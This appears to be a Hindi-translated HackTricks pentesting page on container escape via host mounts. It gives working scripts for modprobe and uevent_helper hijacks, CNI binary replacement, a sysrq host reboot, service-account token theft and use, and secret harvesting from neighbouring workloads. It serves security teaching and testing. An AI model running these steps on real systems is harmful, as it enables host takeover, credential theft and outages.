# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Host mounts महत्वपूर्ण practical container-escape surfaces में से एक हैं, क्योंकि वे अक्सर सावधानीपूर्वक isolated process view को host resources की direct visibility में बदल देते हैं। खतरनाक स्थितियाँ केवल `/` तक सीमित नहीं हैं। `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state या device-related paths के bind mounts kernel controls, credentials, neighboring container filesystems और runtime management interfaces को expose कर सकते हैं।

यह page individual protection pages से अलग मौजूद है, क्योंकि abuse model cross-cutting है। Writable host mount कुछ हद तक mount namespaces, कुछ हद तक user namespaces, कुछ हद तक AppArmor या SELinux coverage, और कुछ हद तक expose किए गए exact host path के कारण खतरनाक होता है। इसे एक स्वतंत्र topic की तरह देखने से attack surface को समझना काफी आसान हो जाता है।

## `/proc` Exposure

procfs में सामान्य process information और high-impact kernel control interfaces दोनों शामिल होते हैं। इसलिए `-v /proc:/host/proc` जैसा bind mount या unexpected writable proc entries को expose करने वाला container view information disclosure, denial of service या direct host code execution का कारण बन सकता है।

High-value procfs paths में शामिल हैं:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (विशेष रूप से `register` और `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

यह जाँचकर शुरुआत करें कि कौन-से high-value procfs entries दिखाई दे रहे हैं या writable हैं:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sys/fs/binfmt_misc/status \
/proc/sys/fs/binfmt_misc/register \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
इन paths को अलग-अलग कारणों से महत्वपूर्ण माना जाता है। writable होने पर `core_pattern`, `modprobe`, और `binfmt_misc` host code-execution paths बन सकते हैं। `kallsyms`, `kmsg`, `kcore`, और `config.gz`, kernel exploitation के लिए शक्तिशाली reconnaissance sources हैं। `sched_debug` और `mountinfo`, process, cgroup, और filesystem context उजागर करते हैं, जिससे container के अंदर से host layout को reconstruct करने में मदद मिल सकती है।

हर path की practical value अलग होती है, और उन सभी को समान impact वाला मानने से triage कठिन हो जाता है:

- `/proc/sys/kernel/core_pattern`
यदि writable हो, तो यह सबसे अधिक impact वाले procfs paths में से एक है, क्योंकि crash के बाद kernel एक pipe handler execute करेगा। ऐसा container जो `core_pattern` को अपने overlay या किसी mounted host path में मौजूद payload की ओर point कर सकता है, अक्सर host code execution प्राप्त कर सकता है। Dedicated example के लिए [read-only-paths.md](protections/read-only-paths.md) भी देखें।
- `/proc/sys/kernel/modprobe`
यह path उस userspace helper को नियंत्रित करता है जिसका उपयोग kernel module-loading logic invoke करने के लिए करता है। यदि यह container से writable हो और host context में interpret किया जाए, तो यह एक अन्य host code-execution primitive बन सकता है। यह विशेष रूप से तब महत्वपूर्ण है जब helper path को trigger करने का कोई तरीका भी मौजूद हो।
- `/proc/sys/vm/panic_on_oom`
यह आमतौर पर clean escape primitive नहीं है, लेकिन OOM conditions को kernel panic behavior में बदलकर memory pressure को host-wide denial of service में बदल सकता है।
- `/proc/sys/fs/binfmt_misc`
यदि registration interface writable हो, तो attacker चुने गए magic value के लिए एक handler register कर सकता है और matching file execute होने पर host-context execution प्राप्त कर सकता है।
- `/proc/config.gz`
Kernel exploit triage के लिए उपयोगी है। यह host package metadata की आवश्यकता के बिना यह निर्धारित करने में मदद करता है कि कौन-से subsystems, mitigations, और optional kernel features enabled हैं।
- `/proc/sysrq-trigger`
मुख्य रूप से denial-of-service path है, लेकिन बहुत गंभीर है। यह host को तुरंत reboot या panic कर सकता है, या अन्यथा उसे disrupt कर सकता है।
- `/proc/kmsg`
Kernel ring buffer messages उजागर करता है। यह host fingerprinting और crash analysis के लिए उपयोगी है, और कुछ environments में kernel exploitation के लिए उपयोगी information leak कर सकता है।
- `/proc/kallsyms`
Readable होने पर मूल्यवान है, क्योंकि यह exported kernel symbol information उजागर करता है और kernel exploit development के दौरान address randomization assumptions को defeat करने में मदद कर सकता है।
- `/proc/[pid]/mem`
यह direct process-memory interface है। यदि target process आवश्यक ptrace-style conditions के साथ reachable हो, तो यह किसी अन्य process की memory को read या modify करने की अनुमति दे सकता है। वास्तविक impact credentials, `hidepid`, Yama, और ptrace restrictions पर बहुत अधिक निर्भर करता है, इसलिए यह एक powerful लेकिन conditional path है।
- `/proc/kcore`
System memory का core-image-style view expose करता है। यह file बहुत बड़ी और उपयोग में awkward है, लेकिन यदि यह meaningfully readable हो, तो यह host memory surface के गंभीर exposure का संकेत देता है।
- `/dev/kmem` और `/dev/mem`
ये ऐतिहासिक रूप से high-impact raw-memory **device** interfaces हैं, procfs files नहीं। कई modern systems पर ये absent या heavily restricted होते हैं, लेकिन यदि कोई container host-mounted copy को open कर सकता है, तो इस exposure को critical मानना चाहिए। इनकी समीक्षा अन्य sensitive `/dev` mounts के साथ करें, न कि मौजूद ही न होने वाले `/proc/kmem` या `/proc/mem` paths को खोजते रहें।
- `/proc/sched_debug`
Scheduling और task information leak करता है, जिससे host process identities उजागर हो सकती हैं, भले ही अन्य process views अपेक्षा से अधिक साफ दिखाई दें।
- `/proc/[pid]/mountinfo`
यह reconstruct करने के लिए अत्यंत उपयोगी है कि container वास्तव में host पर कहाँ स्थित है, कौन-से paths overlay-backed हैं, और कोई writable mount host content से संबंधित है या केवल container layer से।

यदि `/proc/[pid]/mountinfo` या overlay details readable हों, तो उनका उपयोग container filesystem का host path recover करने के लिए करें:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
ये commands उपयोगी हैं क्योंकि कई host-execution tricks के लिए container के अंदर के path को host के दृष्टिकोण से उसके corresponding path में बदलना आवश्यक होता है।

### उदाहरण: `modprobe` Helper Path तैयार करना

यदि `/proc/sys/kernel/modprobe` container से writable है और helper path को host context में interpret किया जाता है, तो इसे attacker-controlled payload की ओर redirect किया जा सकता है। Overlay upper directory को host से resolve होना चाहिए, और यदि container host `/tmp` को भी mount नहीं करता है, तो proof output को उसी host-visible container layer में वापस लिखना आवश्यक है:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```
सटीक trigger target और kernel behavior पर निर्भर करता है और जानबूझकर इसका अनुमान नहीं लगाया गया है। lab से बाहर निकलने से पहले original value restore करें। महत्वपूर्ण बात यह है कि writable helper path, future kernel helper invocation को attacker-controlled host-path content की ओर redirect कर सकता है। Missing overlay `upperdir`, ऐसा path जिसे host resolve नहीं कर सकता, read-only sysctl mount, या ऐसा kernel जो selected helper को कभी invoke नहीं करता, इस chain को तोड़ देता है।

### `kallsyms`, `kmsg`, और `config.gz` के साथ Full Example: Kernel Recon

यदि लक्ष्य तत्काल escape के बजाय exploitability assessment है:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
ये commands यह पता लगाने में मदद करते हैं कि उपयोगी symbol information दिखाई दे रही है या नहीं, हाल के kernel messages से कोई interesting state सामने आ रही है या नहीं, और kernel की कौन-सी features या mitigations compiled in हैं। इसका impact आमतौर पर direct escape नहीं होता, लेकिन यह kernel-vulnerability triage को काफी तेज कर सकता है।

### पूर्ण उदाहरण: SysRq Host Reboot

यदि `/proc/sysrq-trigger` writable है और host view तक पहुंचता है:
```bash
echo b > /proc/sysrq-trigger
```
प्रभाव तुरंत host reboot होता है। यह कोई सूक्ष्म उदाहरण नहीं है, लेकिन यह स्पष्ट रूप से दिखाता है कि procfs exposure information disclosure से कहीं अधिक गंभीर हो सकता है।

## `/sys` Exposure

sysfs बड़ी मात्रा में kernel और device state को expose करता है। कुछ sysfs paths मुख्यतः fingerprinting के लिए उपयोगी होते हैं, जबकि अन्य helper execution, device behavior, security-module configuration या firmware state को प्रभावित कर सकते हैं।

High-value sysfs paths में शामिल हैं:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

ये paths अलग-अलग कारणों से महत्वपूर्ण हैं। `/sys/class/thermal` thermal-management behavior को प्रभावित कर सकता है और इसलिए poorly exposed environments में host stability को प्रभावित कर सकता है। `/sys/kernel/vmcoreinfo` crash-dump और kernel-layout information को leak कर सकता है, जो low-level host fingerprinting में सहायता करती है। `/sys/kernel/security` Linux Security Modules द्वारा उपयोग किया जाने वाला `securityfs` interface है, इसलिए वहां unexpected access MAC-related state को expose या alter कर सकता है। EFI variable paths firmware-backed boot settings को प्रभावित कर सकते हैं, जिससे वे सामान्य configuration files की तुलना में कहीं अधिक गंभीर हो जाते हैं। `/sys/kernel/debug` के अंतर्गत `debugfs` विशेष रूप से खतरनाक है, क्योंकि यह जानबूझकर developer-oriented interface है, जिसमें hardened production-facing kernel APIs की तुलना में safety expectations बहुत कम होती हैं।

इस सूची की प्रत्येक sysfs entry **kernel-, configuration-, और hardware-dependent** है। वर्तमान virtualized nodes में अक्सर `uevent_helper`, EFI variables और thermal-device entries पूरी तरह अनुपस्थित होते हैं। अनुपस्थित path को negative prerequisite के रूप में record करें, न कि यह मानें कि किसी अन्य kernel का उदाहरण यहां भी लागू होता है।

इन paths के लिए उपयोगी review commands हैं:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
वे commands किस कारण से interesting हैं:

- `/sys/kernel/security` से यह पता चल सकता है कि AppArmor, SELinux या कोई अन्य LSM surface ऐसे तरीके से visible है, जिसे केवल host तक सीमित रहना चाहिए था।
- `/sys/kernel/debug` अक्सर इस group में सबसे alarming finding होती है। यदि `debugfs` mounted हो और readable या writable हो, तो एक विस्तृत kernel-facing surface की अपेक्षा करें, जिसका exact risk enabled debug nodes पर निर्भर करता है।
- EFI variable exposure कम common है, लेकिन यदि मौजूद हो, तो इसका impact अधिक होता है क्योंकि यह सामान्य runtime files के बजाय firmware-backed settings को प्रभावित करता है।
- `/sys/class/thermal` मुख्य रूप से host stability और hardware interaction के लिए relevant है, न कि किसी स्पष्ट shell-style escape के लिए।
- `/sys/kernel/vmcoreinfo` मुख्य रूप से host-fingerprinting और crash-analysis का source है, जो low-level kernel state को समझने में उपयोगी है।

### Full Example: `uevent_helper`

`/sys/kernel/uevent_helper` kernel और configuration पर निर्भर करता है और कई current systems पर absent होता है। यदि यह मौजूद हो, writable हो, और usable `uevent` trigger उपलब्ध हो, तो kernel attacker-controlled helper को execute कर सकता है। Proof output में ऐसे path का उपयोग होना चाहिए जो host और container दोनों views से visible हो:
```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
echo "No writable, pre-approved uevent trigger was found" >&2
exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```
इसका काम करने का कारण यह है कि helper path को host के दृष्टिकोण से interpret किया जाता है। Trigger होने के बाद helper वर्तमान container के अंदर चलने के बजाय host context में चलता है। `/sys/class/mem/null/uevent` उन kernels पर एक concrete trigger है जो इसे expose करते हैं; अन्य devices अपनी `uevent` files expose कर सकते हैं, लेकिन real hardware पर किसी एक को बिना सोचे-समझे select न करें। Lab छोड़ने से पहले original value restore करें। जब helper file या controlled trigger मौजूद न हो, तब इस technique को available के रूप में report न करें।

## `/var` Exposure

Host के `/var` को किसी container में mount करना अक्सर underestimate किया जाता है, क्योंकि यह `/` को mount करने जितना dramatic नहीं दिखता। व्यवहार में यह runtime sockets, container snapshot directories, kubelet-managed pod volumes, projected service-account tokens और neighboring application filesystems तक पहुंचने के लिए पर्याप्त हो सकता है। Modern nodes पर `/var` अक्सर वह स्थान होता है जहां सबसे अधिक operationally interesting container state वास्तव में रहती है।

### Kubernetes Example

`hostPath: /var` वाला pod अक्सर अन्य pods के projected tokens और overlay snapshot content पढ़ सकता है:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
ये commands उपयोगी हैं क्योंकि वे बताते हैं कि mount केवल सामान्य application data expose करता है या high-impact cluster credentials भी। Readable service-account token local code execution को तुरंत Kubernetes API access में बदल सकता है।

यदि token मौजूद है, तो केवल token discovery पर रुकने के बजाय यह validate करें कि वह किन resources तक पहुँच सकता है:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
यहाँ impact local node access से कहीं अधिक बड़ा हो सकता है। Broad RBAC वाला token mounted `/var` को पूरे cluster के compromise में बदल सकता है।

### Docker और containerd Example

Docker hosts पर संबंधित data अक्सर `/var/lib/docker` के अंतर्गत होता है, जबकि containerd-backed Kubernetes nodes पर यह `/var/lib/containerd` या snapshotter-specific paths के अंतर्गत हो सकता है:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
यदि mounted `/var` किसी अन्य workload के writable snapshot contents को expose करता है, तो attacker application files को बदल सकता है, web content plant कर सकता है, या current container configuration को छुए बिना startup scripts बदल सकता है।

एक **disposable lab workload** पर, writable snapshot content application tampering, secret recovery या lateral movement को प्रदर्शित कर सकता है। पहले runtime container ID को exact snapshot से map करें और किसी असंबंधित या production snapshot को कभी edit न करें:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```
ये commands उपयोगी हैं क्योंकि ये mounted `/var` के प्रभाव की तीन मुख्य श्रेणियां दिखाते हैं: application tampering, secret recovery और neighboring workloads में lateral movement।

Direct snapshot writes runtime के सामान्य state management को bypass कर सकती हैं और container को corrupt कर सकती हैं या evidence नष्ट कर सकती हैं। Read-only discovery को Docker `overlay2` के विरुद्ध locally reproduce किया गया: neighboring disposable container में लिखा गया marker `/var/lib/docker/overlay2/<id>/diff/` के नीचे दिखाई दिया। वास्तविक snapshot modification को इस test के लिए बनाए गए disposable container तक सीमित रखें।

## Kubelet State, Plugins And CNI Paths

`/var/lib/kubelet`, `/opt/cni/bin` या `/etc/cni/net.d` का mount अक्सर privileged DaemonSets, CNI agents, CSI node plugins, GPU operators और storage helpers के माध्यम से exposed होता है। इन mounts को "node plumbing" मानकर आसानी से नज़रअंदाज़ किया जा सकता है, लेकिन ये नए pods के execution path में सीधे स्थित होते हैं और इनमें अक्सर kubelet credentials, projected secrets, registration sockets और executable host-side plugin binaries होते हैं।

High-value targets में शामिल हैं:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

उपयोगी review commands हैं:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
ये paths क्यों महत्वपूर्ण हैं:

- `/var/lib/kubelet/pki` kubelet client certificates और अन्य node-local credentials को expose कर सकता है, जिन्हें cluster design के आधार पर कभी-कभी API server या kubelet-facing TLS endpoints के विरुद्ध reuse किया जा सकता है।<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` में अक्सर उसी node पर मौजूद neighboring pods के लिए projected service-account tokens और mounted Secrets होते हैं।
- `/var/lib/kubelet/pod-resources/kubelet.sock` मुख्यतः एक reconnaissance surface है, लेकिन यह बहुत उपयोगी है: इससे पता चलता है कि वर्तमान में कौन-से pods और containers GPUs, hugepages, SR-IOV devices और अन्य scarce node-local resources के owner हैं।<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` और `/var/lib/kubelet/plugins_registry` से पता चलता है कि कौन-से CSI, DRA और device plugins installed हैं और kubelet को किन sockets से बात करनी है। यदि ये directories केवल readable होने के बजाय writable हैं, तो finding कहीं अधिक गंभीर हो जाती है।<sup>[[1]](#references)</sup>
- `/opt/cni/bin` और `/etc/cni/net.d` pod-network setup path पर सीधे मौजूद होते हैं। वहाँ writable access अक्सर केवल configuration exposure के बजाय delayed host-execution primitive होता है।<sup>[[2]](#references)</sup>

### Full Example: Writable `/opt/cni/bin`

यदि host CNI binary directory read-write रूप में mounted है, तो किसी plugin को replace करना अगली बार kubelet द्वारा उस node पर pod sandbox बनाए जाने पर host execution प्राप्त करने के लिए पर्याप्त हो सकता है:<sup>[[2]](#references)</sup>
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```
यह mounted `docker.sock` जितना immediate नहीं है, लेकिन compromised Kubernetes infrastructure pods में यह अक्सर अधिक realistic होता है। marker को mounted plugin के बगल में लिखा जाता है, ताकि container इसे host-root या host-`/tmp` mount के बिना भी retrieve कर सके। wrapper original arguments और standard input को preserve करता है, फिर example original binary को restore करता है। महत्वपूर्ण बात यह है कि modified binary को बाद में host network setup flow द्वारा execute किया जाता है, current container द्वारा नहीं। केवल disposable node का उपयोग करें, क्योंकि एक invalid wrapper नए Pod sandboxes को networking प्राप्त करने से रोक सकता है।

## Runtime Sockets

Sensitive host mounts में अक्सर full directories के बजाय runtime sockets शामिल होते हैं। ये इतने महत्वपूर्ण हैं कि यहां इन्हें स्पष्ट रूप से दोहराना आवश्यक है:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
इनमें से किसी socket के mount हो जाने के बाद पूरे exploitation flows के लिए [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) देखें।

एक त्वरित प्रारंभिक interaction pattern के रूप में:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
यदि इनमें से कोई सफल हो जाता है, तो "mounted socket" से "start a more privileged sibling container" तक का रास्ता आमतौर पर किसी भी kernel breakout path की तुलना में बहुत छोटा होता है।

## Writable Host Path Task Hijack

एक writable host mount का खतरनाक होने के लिए `/` को expose करना आवश्यक नहीं है। यदि mounted path में scripts, config files, hooks, plugins या ऐसी files शामिल हैं जिन्हें बाद में host-side scheduled task या service consume करती है, तो container host द्वारा execute किए जाने वाले content को बदलने में सक्षम हो सकता है।

Generic review flow:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
यदि किसी writable file को host process consume करता है, तो testing के दौरान payload को simple और observable रखें:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
दिलचस्प हिस्सा trust boundary है: write container के अंदर से होता है, लेकिन execution बाद में host service context में होता है। इससे एक संकीर्ण hostPath या bind mount delayed host-code-execution primitive में बदल जाता है।

## Mount से संबंधित CVEs

Host mounts runtime vulnerabilities के साथ भी intersect करते हैं। हाल के महत्वपूर्ण उदाहरणों में शामिल हैं:

- `CVE-2024-21626` in `runc`, जहाँ leaked directory file descriptor working directory को host filesystem पर रख सकता था।
- `CVE-2024-23651`, `CVE-2024-23652`, और `CVE-2024-23653` in BuildKit, जहाँ malicious Dockerfiles, frontends, और `RUN --mount` flows builds के दौरान host file access, deletion, या elevated privileges को फिर से सक्षम कर सकते थे।
- `CVE-2024-1753` in Buildah और Podman build flows, जहाँ crafted bind mounts build के दौरान `/` को read-write के रूप में expose कर सकते थे।
- `CVE-2025-47290` in `containerd` 2.1.0, जहाँ image unpack के दौरान TOCTOU विशेष रूप से बनाई गई image को pull के दौरान host filesystem में बदलाव करने दे सकता था।

ये CVEs यहाँ महत्वपूर्ण हैं क्योंकि वे दिखाते हैं कि mount handling केवल operator configuration का विषय नहीं है। Runtime स्वयं भी mount-driven escape conditions उत्पन्न कर सकता है।

## Checks

इन commands का उपयोग करके highest-value mount exposures को जल्दी locate करें:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
यहाँ क्या महत्वपूर्ण है:

- Host root, `/proc`, `/sys`, `/var`, और runtime sockets सभी high-priority findings हैं।
- Writable proc/sys entries का अक्सर अर्थ होता है कि mount किसी सुरक्षित container view के बजाय host-global kernel controls को expose कर रहा है।
- Mounted `/var` paths की समीक्षा केवल filesystem तक सीमित नहीं होनी चाहिए; credentials और neighboring workloads की भी जाँच करनी चाहिए।
- Kubelet state directories और CNI/plugin paths को runtime sockets जितनी ही priority मिलनी चाहिए, क्योंकि वे अक्सर node के pod-creation और credential-distribution path पर सीधे स्थित होते हैं।

## Local Validation Status

इस page पर मौजूद practical chains को local Linux minikube node के विरुद्ध जाँचा गया। Validation में निम्नलिखित को reproduce किया गया:

- temporary writable hostPath के माध्यम से read और write access
- `/var/lib/kubelet/pods` के माध्यम से projected ServiceAccount tokens और mounted Secrets की discovery
- mounted kubelet state से recovered live token के साथ successful Kubernetes API authentication
- mounted `/var` के माध्यम से neighboring Docker `overlay2` filesystem की read-only discovery
- mounted `docker.sock` के माध्यम से read-only host bind वाला sibling container बनाने के लिए Docker API का उपयोग
- temporary host-consumed hook के माध्यम से delayed host execution
- ऐसा CNI-wrapper simulation जिसने original plugin के arguments, standard input और execution को बनाए रखा

उसी node ने `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore`, और `config.gz` expose किए, लेकिन उसने `uevent_helper`, EFI variables, thermal entries या `sched_debug` expose नहीं किए। Destructive kernel triggers execute नहीं किए गए। इससे पुष्टि होती है कि host-root, `/var`, kubelet-state, socket और host-consumer chains reproducible हैं, जबकि procfs/sysfs helper techniques को exact kernel, mount mode, payload path और trigger पर conditional रखना आवश्यक है।

## References

- [1] [Kubelet द्वारा उपयोग की जाने वाली Local Files और Paths](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [cilium-agent container `hostPath` mount के माध्यम से host तक पहुँच सकता है](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
